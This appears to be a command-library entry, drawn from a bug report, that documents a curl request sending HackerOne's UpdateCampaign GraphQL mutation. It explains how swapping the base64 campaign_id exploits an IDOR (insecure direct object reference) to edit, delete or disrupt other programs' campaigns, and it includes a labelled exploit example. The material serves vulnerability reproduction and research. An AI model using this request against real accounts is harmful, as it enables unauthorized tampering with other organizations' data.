---
data: >-
  curl -X POST https://hackerone.com/graphql -H 'Cookie: yourcookie' -H
  'Content-Type: application/json' -d
  '{"operationName":"UpdateCampaign","variables":{"product_area":"campaigns","product_feature":"edit","input":{"campaign_id":"Z2lkOi8vaGFja2Vyb25lL0NhbXBhaWduLzI0NA==","team_id":"Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU3MzI4","bounty_table_row_id":"Z2lkOi8vaGFja2Vyb25lL0JvdW50eVRhYmxlUm93LzEwODM2","start_date":"2023-05-05T09:00:00Z","end_date":"2023-05-08T05:00:00Z","critical":3,"high":2,"medium":1.5,"low":1.5,"structured_scope_ids":[],"researchers_information":"ccccccccccccccc"}},"query":"mutation
  UpdateCampaign($input: UpdateCampaignInput!) {\n updateCampaign(input: $input)
  {\n was_successful\n errors {\n edges {\n node {\n id\n type\n field\n
  message\n __typename\n }\n __typename\n }\n __typename\n }\n __typename\n
  }\n}"}'
tags:
  - graphql
  - exploit
  - idor
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:48.263Z'
id: bbc8b3e8-16d5-4619-83b6-4bf4c2892309
verified: false
validated: true
submitted: true
---
# UpdateCampaign GraphQL Mutation

## Command

```bash
curl -X POST https://hackerone.com/graphql \
  -H 'Cookie: yourcookie' \
  -H 'Content-Type: application/json' \
  -H 'X-Csrf-Token: ███' \
  -d '{"operationName":"UpdateCampaign","variables":{"input":{"campaign_id":"Z2lkOi8vaGFja2Vyb25lL0NhbXBhaWduLzI0NA==","team_id":"Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU3MzI4","bounty_table_row_id":"Z2lkOi8vaGFja2Vyb25lL0JvdW50eVRhYmxlUm93LzEwODM2","start_date":"2023-05-05T09:00:00Z","end_date":"2023-05-08T05:00:00Z","critical":3,"high":2,"medium":1.5,"low":1.5,"structured_scope_ids":[],"researchers_information":"ccccccccccccccc"}},"query":"mutation UpdateCampaign($input: UpdateCampaignInput!) { updateCampaign(input: $input) { was_successful errors { edges { node { id type field message __typename } __typename } __typename } __typename } }"}'
```

## Description

Sends a GraphQL mutation to update a HackerOne campaign, which can be modified by changing the base64-encoded campaign_id to exploit IDOR for unauthorized access. Used in reproduction to edit, delete, or disrupt campaigns.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| campaign_id | Base64-encoded GlobalID of the target campaign (modifiable for IDOR) | Yes |
| team_id | Base64-encoded ID of the team/program | Yes |
| bounty_table_row_id | Base64-encoded bounty table row ID | Yes |
| start_date | ISO 8601 start date | No |
| end_date | ISO 8601 end date | No |
| critical/high/medium/low | Bounty amounts for severity levels | No |
| structured_scope_ids | Array of scope IDs | No |
| researchers_information | Additional info string | No |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/graphql -H 'Cookie: yourcookie' -H 'Content-Type: application/json' -d '{... legitimate payload ...}'
```

### Advanced Usage (IDOR Exploit)

```bash
curl -X POST https://hackerone.com/graphql -H 'Cookie: yourcookie' -H 'Content-Type: application/json' -d '{... with modified campaign_id ...}'
```

## Expected Output

JSON response: {"data":{"updateCampaign":{"was_successful":true}}} if successful; errors array if failed (e.g., post-fix authorization denial).

## Related

- [[procedures/Send-Modified-UpdateCampaign-Request]]
